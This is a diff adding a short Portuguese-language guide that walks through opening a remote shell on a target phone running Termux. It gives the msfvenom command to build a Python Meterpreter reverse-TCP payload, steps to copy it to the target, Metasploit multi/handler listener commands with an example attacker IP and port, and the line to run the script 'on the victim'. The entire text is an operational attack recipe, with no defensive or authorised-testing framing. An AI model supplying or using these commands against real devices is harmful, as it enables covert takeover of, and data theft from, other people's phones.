@@ -1,0 +1,37 @@
+Passos:Gerar o Payload com msfvenom:
+
+msfvenom -p python/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f raw > reverseshell.py
+
+Substitua <YOUR_IP> pelo endereço IP da sua máquina atacante e <YOUR_PORT> pela porta que você deseja usar.
+Transferir o Arquivo para o Alvo:
+Transfira o arquivo reverseshell.py gerado para o dispositivo alvo (Termux no celular).
+Configurar o Metasploit para Escuta:msfconsoleDentro do msfconsole, execute os seguintes comandos:
+
+use exploit/multi/handler
+set payload python/meterpreter_reverse_tcp
+set LHOST <YOUR_IP>
+set LPORT <YOUR_PORT>
+run
+
+Executar o Payload no Alvo:No Termux (ou dispositivo alvo), execute o script Python:
+python reverseshell.py
+Explicação:msfvenom: Gera o payload.
+msfconsole: Abre a console do Metasploit.
+use exploit/multi/handler: Configura o handler para receber a conexão reversa.
+set payload python/meterpreter_reverse_tcp:
+Define o payload.set LHOST e set LPORT:
+Define o endereço IP e a porta da máquina atacante.
+run: Inicia o listener para aguardar a conexão reversa.
+
+Certifique-se de que o seu firewall permite a conexão na porta escolhida e que o dispositivo alvo tem acesso à rede para se conectar ao IP da máquina atacante.
+
+EXEMPLO 
+
+use exploit/multi/handler
+set payload python/meterpreter_reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+run
+
+Executar o script Python na vítima:
+python3 reverse_shell.py
